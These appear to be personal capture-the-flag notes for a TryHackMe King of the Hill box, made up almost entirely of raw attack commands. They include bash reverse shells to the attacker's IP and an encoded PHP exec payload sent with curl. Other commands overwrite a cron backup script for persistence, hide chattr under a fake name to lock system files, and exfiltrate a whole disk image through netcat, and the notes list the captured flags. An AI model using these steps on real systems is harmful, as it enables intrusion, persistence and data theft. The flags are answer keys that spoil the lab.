grep "flag" ./^? 2>/dev/null  
  
nmap the IP  
access Lesson page  
run nc -lvp 4444  
use php/bash reverse shell  
exec("/bin/bash -c 'bash -i >& /dev/tcp/attacking ip/4444 0>&1'");  
flag  
  
Stabilize shell-  
steps to stabilize your shell
1. 
```bash 
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Which uses Python to spawn a better-featured bash shell. At this point, our shell will look a bit prettier, but we still won’t be able to use tab autocomplete or the arrow keys.whi

2.  
```bash
export TERM=xterm
```
This will give us access to term commands such as clear.

Finally (and most importantly) we will background the shell using

3. Ctrl + Z
Back in our own terminal we use

```bash
Ctrl-Z
```

This does two things: first, it turns off our own terminal echo which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes

```bash 
stty rows 38 columns 116
```


1st flag is in serv4 
/var/www/serv4/index.php/index.php/
THM{YmNlODZjN2I2ZDEwM2FlMDA5Y2RiYzZh}

find crontab file
nano /home/serv3/backups/backup.sh

bash -i >& /dev/tcp/10.6.14.44/4444 0>&1

while true; do echo "7h30" > king.txt; done

 root: THM{OWQyMGRlNWM0NjYzN2NmM2MxMDNkODgx}



  
  
  
  
  
  
  
  
  
  
  
  
  
  
#  
# NMAP RESULTS  
#  
Discovered open port 22/tcp on 10.10.186.108  
Discovered open port 80/tcp on 10.10.186.108  
Discovered open port 8001/tcp on 10.10.186.108  
Discovered open port 8002/tcp on 10.10.186.108  
Discovered open port 8000/tcp on 10.10.186.108  
Discovered open port 9999/tcp on 10.10.186.108  
  
#  
# SETUP  
#  
cd ~/ctf/tryhackme/koth/H1  
TARGET=10.10.56.188  
MYIP=10.4.11.103  
MYPORT=8888  
  
#  
# INFILTRATE  
#  
python -m http.server 8887  
nc -lvp 8888  
  
MYIP=10.4.11.103  
curl "http://$TARGET:8002/trycode" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "Connection: keep-alive" --data-raw "code=exec("%"22"%"2Fbin"%"2Fbash+-c+'bash+-i+"%"3E"%"26+"%"2Fdev"%"2Ftcp"%"2F$MYIP"%"2F8888+0"%"3E"%"261'"%"22)"%"3B"  
  
MYIP=10.4.11.103  
wget $MYIP:8887/backup.sh -O /home/serv3/backups/backup.sh.1  
mv /home/serv3/backups/backup.sh.1 /home/serv3/backups/backup.sh  
chmod 700 /home/serv3/backups/backup.sh  
ssh -i id_rsa root@$TARGET  
  
echo '#!/usr/bin/env bash' > /home/serv3/backups/backup.sh  
echo 'echo 7h30 > /root/king.txt' >> /home/serv3/backups/backup.sh  
cd  
mv `which chattr` /usr/bin/pbmtoat  
pbmtoat +i /root/king.txt  
pbmtoat +i /root/.ssh/authorized_keys  
pbmtoat +i /etc/passwd  
pbmtoat +i /etc/shadow  
chmod 700 /root/.ssh  
pbmtoat +i /home/serv3/backups/backup.sh  
  
#  
# PROTECT  
#  
rm /etc/sudoers.d/serv2  
rm -rf /var/www/html/topSecretPrivescMethod/  
echo '{"username":"admin","password":"notadmin","cookie":"1234bac1ea76920a79d435d0b74581c6"}' > /var/www/serv1/data/user.txt  
chown root:root /home/serv3/backups/backup.sh  
chmod 755 `which bash`  
  
# STEAL DISK  
python -m http.server 8888  
cd /usr/bin  
wget $MYIP:8888/nc.openbsd -O nc  
chmod +x nc  
  
nc -l 8888|bzip2 -d|dd bs=1G count=1 of=/home/nohusuro/ctf/tryhackme/koth/H1/disk_p1.bin  
bzip2 -c /dev/xvda1 | netcat $MYIP 8888  
  
lsattr  
  
  
  
  
#  
# FLAGS  
#  
THM{YmNlODZjN2I2ZDEwM2FlMDA5Y2RiYzZh}  
THM{OWQyMGRlNWM0NjYzN2NmM2MxMDNkODgx}  
THM{NGI4Nzk4OGI3MDE4NDUzNWYwNjMyZjY1}  
THM{Bet_You're_Glad_This_Is_Not_A_Hash}  
  
/var/www/serv4/index.php :: THM{YmNlODZjN2I2ZDEwM2FlMDA5Y2RiYzZh}  
/root/root.txt :: THM{OWQyMGRlNWM0NjYzN2NmM2MxMDNkODgx}  
base64 -d /usr/games/fortune :: THM{NGI4Nzk4OGI3MDE4NDUzNWYwNjMyZjY1}  
/var/lib/rary :: THM{Bet_You're_Glad_This_Is_Not_A_Hash}  
  
  
# UNKNOWNS  
  
/var/www/html/topSecretPrivescMethod/secret.txt  
  
256 byte file, which could be  
- encrypted text (gpg?)  
- an encryption key file ?  
- shell code of some sorts  
  
256 byte = 2048 bit output